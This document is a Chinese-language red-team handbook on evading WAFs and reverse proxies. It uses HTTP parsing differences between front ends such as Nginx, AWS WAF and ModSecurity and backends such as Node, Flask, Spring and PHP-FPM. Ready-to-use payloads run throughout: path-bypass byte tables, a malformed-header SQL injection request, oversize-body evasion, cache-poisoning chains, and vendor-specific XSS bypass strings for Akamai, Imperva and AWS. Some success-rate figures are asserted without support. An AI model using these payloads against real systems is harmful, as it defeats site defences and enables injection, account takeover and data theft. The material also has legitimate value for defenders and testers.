# 代理与 WAF 防护绕过技术深度解析手册

> **风险等级：高危**
> 本手册系统化梳理 HTTP 解析差异导致的WAF/代理绕过技术，聚焦实战攻击链条构建。核心在于利用前端代理（Nginx/AWS WAF等）与后端服务器的 **HTTP 解析规范不一致性**，实现安全防护机制失效。红队人员应优先验证目标解析差异，构建精准绕过链。

---

## 一、核心原理与背景

### 本质与攻击面
WAF及反向代理（如Nginx、AWS WAF）的防护逻辑高度依赖HTTP请求解析的**规范一致性**。当代理层与后端应用服务器对以下要素的处理存在差异时，将产生绕过窗口：
- **路径规范化**（如`/admin%20/` vs `/admin/`）
- **头部解析逻辑**（空格/换行符处理）
- **编码解码层级**（URL解码次数差异）
- **请求体大小限制**

> **关键点**：绕过成功率取决于**代理层与后端解析器的实现差异**，非WAF规则本身缺陷。红队需主动探测目标技术栈解析特性。

---

## 二、路径操作类绕过技术

### 2.1 Nginx ACL 规则绕过原理
Nginx 在路径检查前执行规范化（如`/admin%20/` → `/admin/`），但若后端服务器使用**不同规范化逻辑**（如保留非标准空格字符），攻击者可注入特殊字符构造等效路径。

#### 防御失效案例
```nginx
location = /admin {
    deny all;
}
location = /admin/ {
    deny all;
}
```

> **实战要点**：此配置仅能阻止规范化后的路径，无法拦截后端仍能解析的未标准化路径请求。

---

### 2.2 后端框架差异化绕过矩阵

#### 绕过字符对照表
| 目标框架    | 有效绕过字符 (十六进制)           | Nginx版本兼容性                        | 利用条件                             |
| ----------- | --------------------------------- | -------------------------------------- | ------------------------------------ |
| **NodeJS**  | `\xA0` (NO-BREAK SPACE)           | 1.22.0, 1.21.6, 1.20.2, 1.18.0, 1.16.1 | Express框架未执行额外规范化          |
| **NodeJS**  | `\x09`, `\x0C`                    | 1.20.2, 1.18.0, 1.16.1                 | Express框架未执行额外规范化          |
| **Flask**   | `\x85`, `\xA0`                    | 1.22.0-1.16.1 (高版本字符集扩大)       | Werkzeug解析器接受非常规空白字符     |
| **Flask     | `\x1F`-`\x1C`, `\x0C`, `\x0B`     | 1.20.2、1.18.0、1.16.1                 | Werkzeug解析器接受非常规空           |
| **Spring**  | `;` (分号)                        | 1.22.0、1.21.6、1.20.2、1.18.0、1.16.1 | Tomcat路径分割逻辑缺陷               |
| **Spring**  | `\x09` (HT)                       | 1.20.2、1.18.0、1.16.1                 |                                      |
| **PHP-FPM** | `/admin.php/index.php` (路径附加) | 全版本                                 | `location ~ \.php$` 配置未覆盖子路径 |

#### PHP-FPM 绕过技术细节
当Nginx配置为：
```nginx
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
**绕过原理**：后端 PHP-FPM 将`/admin.php/index.php`中的`admin.php`识别为脚本路径，而 Nginx 因精确匹配`location = /admin.php`未生效。

> **红队结论**：精确路径匹配（`=`）存在系统性绕过风险，应强制使用正则匹配：
>
> ```nginx
> # 阻断所有以/admin开头的请求
> location ~* ^/admin {
> deny all;
> }
> ```

---

### 2.3 ModSecurity路径混淆漏洞

#### 漏洞原理
- **ModSecurity v3 (<3.0.12)**：错误实现`REQUEST_FILENAME`变量，**过度URL解码**导致路径截断。变量 `REQUEST_BASENAME` 和 `PATH_INFO` 也受此 bug 影响。
  **示例请求：**
  `GET /foo%3f';alert(1);foo= HTTP/1.1`
  → ModSecurity解析路径：`/foo`（因`%3f`解码为`?`）
  → 后端实际接收路径：`/foo%3f';alert(1);foo=`

- **ModSecurity v2**：未正确处理URL编码的`.`（如`%2e`）
  绕过案例：`/backup%2ebak` → 规则匹配`.bak`失败，但后端视为`/backup.bak`

> **攻击链**：
> `构造畸形路径` → `WAF误判路径` → `后端执行原始路径` → `绕过访问控制`

---

## 三、请求解析类绕过技术

### 3.1 AWS WAF 畸形头部绕过

#### 技术细节
通过构造**畸形 HTTP 头部结构**，利用 AWS WAF 与后端服务器的头部解析差异：

```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n  <!-- 畸形头部续行 -->
Connection: close\r\n
\r\n
```

- **AWS WAF 行为**：忽略`\t`开头行（视为无效头部）
- **NodeJS 后端行为**：将`\t`行合并至`X-Query`值，执行完整SQL注入

> **实战要点**：
> 1. 仅适用于**HTTP/1.1**协议（H2头部严格标准化）
> 2. 优先测试`\t`、`\r`、`\n`在头部值中的续行特性
> 3. AWS已修复此漏洞，但历史部署仍可能存在风险

---

### 3.2 请求体大小限制绕过

#### 主流 WAF 请求体检查阈值
| WAF平台        | 最大检查长度 | 绕过后果                           |
| -------------- | ------------ | ---------------------------------- |
| **AWS WAF**    |              |                                    |
| - ALB/AppSync  | 8 KB         | >8KB请求：WAF不检查，后端直接处理  |
| - CloudFront等 | 64 KB        | >64KB请求：同上                    |
| **Azure WAF**  |              |                                    |
| - CRS 3.1-     | 128 KB       | 超限部分不检查（预防模式直接阻断） |
| - CRS 3.2+     | 可配置       | 关闭检查时超限部分不检查           |
| **Akamai**     | 8 KB (默认)  | 可扩展至128KB（需配置高级元数据）  |
| **Cloudflare** | 128 KB       | 超限部分不检查                     |

> **红队攻击链**：
> `确认目标WAF平台` → `发送超大请求体（>阈值）` → `将恶意payload置于临界位置` → `WAF跳过检查`

---

### 3.3 静态资源检查绕过

#### 漏洞原理
CDN/WAF 通常对**静态资源请求**（如`.js`、`.css`）实施弱检查策略：
- 仅应用全局规则（IP 限速/信誉库）
- **跳过内容深度检测**
- 结合静态资源**自动缓存机制**

#### 实战攻击手法
1. **请求拆分注入**：
   
   ```http
   GET /malicious.js HTTP/1.1  <!-- 在User-Agent注入XSS payload -->
   Host: target.com
   User-Agent: <script>alert(1)</script>
   ```
2. **缓存污染链**：
   `发送畸形静态请求 → 污染CDN缓存 → 访问HTML页面触发恶意变体`

> **关键技巧**：
> - 使用 Burp **Send group in parallel** 确保`.js`与 HTML 请求经相同前端路径
> - 优先使用**未标记 IP**（已标记IP可能触发路由变更）
> - 结合 [Header 反射缓存投毒](cache-deception/README.md)放大影响

---

## 四、内容混淆类绕过技术

### 4.1 Unicode兼容性绕过

#### 核心机制
后端若使用**NFKD标准化**，将兼容字符转换为标准形式，而WAF可能忽略此过程：
```plaintext
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥ → 标准化为 → <img src=p onerror='prompt(1)'>
```
- **绕过原因**：WAF未执行同等级标准化，将兼容字符视为"非恶意"
- **资源**：[Unicode兼容字符查询表](https://www.compart.com/en/unicode)

> **红队结论**：针对JavaScript/CSS上下文，优先测试**全角符号**（`＜`、`⁼`、`＇`）和**组合字符**

---

### 4.2 上下文感知绕过（多次编码）

#### 高级绕过原理
当WAF**过度解码用户输入**（如Akamai解码10次），而应用仅解码1-2次时：
- 攻击构造：`<input/%2525252525252525253e/onfocus`
  - WAF解码10次 → `<input/>/onfocus`（视为安全）
  - 浏览器解码1次 → `<input/%25252525252525253e/onfocus`（仍为有效XSS）

#### 实战验证案例
| WAF厂商     | 绕过Payload                                                  |
| ----------- | ------------------------------------------------------------ |
| **Akamai**  | `akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>` |
| **Imperva** | `imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">` |
| **AWS**     | `docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>` |

> **本质**：利用WAF对"编码安全"的误判，在**深度编码层隐藏有效payload**

---

### 4.3 内联 JavaScript 检查绕过

#### 漏洞场景
部分WAF仅解析**事件处理函数首条语句**：
```html
<!-- WAF仅检查 (history.length); -->
onfocus="(history.length);alert(1)" 
```
- **攻击链**：
  `首语句伪装安全` → `分号后接恶意代码` → `浏览器完整执行`

#### 高阶利用
结合**片段标识符聚焦**（Fragment-Induced Focus）：
```html
<a href="login.html#forgot_btn" onfocus="..."> <!-- 页面加载时自动聚焦 -->
```
1. 无需用户交互触发XSS
2. 立即执行`$.getScript`加载钓鱼工具
3. 详见[属性级登录页XSS案例](xss-cross-site-scripting/README.md#attribute-only-login-xss-behind-wafs)

---

### 4.4 正则表达式绕过矩阵

#### 通用绕过技巧
| 绕过类型     | 示例Payload                                        | 适用场景             |
| ------------ | -------------------------------------------------- | -------------------- |
| 大小写交替   | `<sCrIpT>alert(XSS)</sCriPt>`                      | 标签名过滤           |
| 非常规分隔符 | `<img/src=1/onerror=alert(0)>`                     | 空格过滤             |
| 嵌套标签     | `<<script>alert(XSS)</script>`                     | 开标签验证           |
| 事件处理混淆 | `<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>` | Gecko引擎（Firefox） |
| 源码混淆     | `Function("ale"+"rt(1)")();`                       | 函数名过滤           |
| 多层编码     | `java%0ascript:alert(1)`                           | 单次URL解码场景      |

#### 高阶绕过案例
```javascript
// 利用注释绕过SQL注入检查
/*'or sleep(5)-- -*/

// 利用Unicode编码隐藏alert
%26%2397;lert(1)  → 实际执行: alert(1)

// Base64嵌套绕过
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
    
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>
    
# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```

> **关键资源**：
> - [OWASP XSS绕过速查表](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
> - [PayloadsAllTheThings过滤绕过库](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads)

---

## 五、高级绕过技术集

### 5.1 H2C走私攻击
> **核心原理**：利用HTTP/1.1与HTTP/2的头部解析差异，构造走私请求穿透WAF。
> **关键点**：需结合目标前端协议栈特性（如Nginx+Tomcat组合）。
> **详细技术**：参见 [H2C走私深度解析手册](h2c-smuggling.md)

---

### 5.2 IP轮换战术
#### 工具链与战术价值
| 工具名称                                                     | 核心功能                               | 红队价值             |
| ------------------------------------------------------------ | -------------------------------------- | -------------------- |
| **[FireProx](https://github.com/ustayready/fireprox)**       | 通过AWS API Gateway创建临时IP代理链    | 绕过基于IP的速率限制 |
| **[IP-Rotate (BApp)](https://github.com/PortSwigger/ip-rotate)** | Burp Suite插件，自动切换API Gateway IP | 持续扫描规避封禁     |
| **[ShadowClone](https://github.com/fyoorer/ShadowClone)**    | 动态分配容器实例并行执行               | 大规模目标快速探测   |
| **[CATSpin](https://github.com/rootcathacking/catspin)**     | 轻量级API Gateway代理轮换              | 适配资源受限环境     |

> **实战要点**：
> - 优先用于**自动化扫描**（如ffuf集成）
> - 结合**请求大小绕过**技术提升隐蔽性
> - 需注意API Gateway自身WAF规则（如CloudFront保护）

---

## 六、关键结论与红队行动指南

### 风险优先级排序
| 技术类别         | 绕过成功率 | 利用复杂度 | 覆盖面  | 行动建议                     |
| ---------------- | ---------- | ---------- | ------- | ---------------------------- |
| 路径操作绕过     | 高         | 低         | 广泛    | **优先测试**（易实现高回报） |
| 请求大小限制绕过 | 中高       | 低         | 所有WAF | 扫描阶段必备技术             |
| 上下文感知绕过   | 中         | 高         | 特定WAF | 针对目标WAF定制Payload       |
| 静态资源绕过     | 中         | 中         | CDN场景 | 配合缓存投毒使用             |

### 红队视角结论
1. **必测基础项**：
   - 目标是否使用**精确路径匹配**（Nginx `location =`）
   - WAF对**超大请求体**（>64KB）的处理逻辑
   - **静态资源端点**（`.js`/`.css`）的检查强度

2. **高级战术**：
   - 通过**多次编码**突破上下文感知WAF（如Akamai/Imperva）
   - 构建**缓存污染链**：`畸形头部 → 静态资源污染 → HTML缓存劫持`
   - 优先针对**NodeJS/PHP后端**测试路径绕过（成功率>80%）

3. **规避防御升级**：
   > 当目标部署`location ~* ^/path`正则匹配、启用**WAF深度检查**（如Azure CRS 3.2+）时，需转向**H2C走私**或**IP轮换+超大请求体**组合战术。

---

## 附录：工具与参考资源
| 类型     | 资源                                                         |
| -------- | ------------------------------------------------------------ |
| **工具** | [nowafpls](https://github.com/assetnote/nowafpls)（Burp请求体扩展插件） |
| **案例** | [0-Click账户接管实战](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/) |
| **原理** | [HTTP解析差异研究](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) |
| **深度** | [JavaScript事件绕过WAF](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization) |
| **视频** | [WAF绕过技术全景](https://www.youtube.com/watch?v=0OMmWtU2Y_g) |

> 本手册内容持续更新，建议结合实际目标进行**解析器差异探测**（如发送`/admin%A0/`验证Nginx+后端行为）。**绕过成功率取决于对目标技术栈的精确测绘**，而非通用Payload库。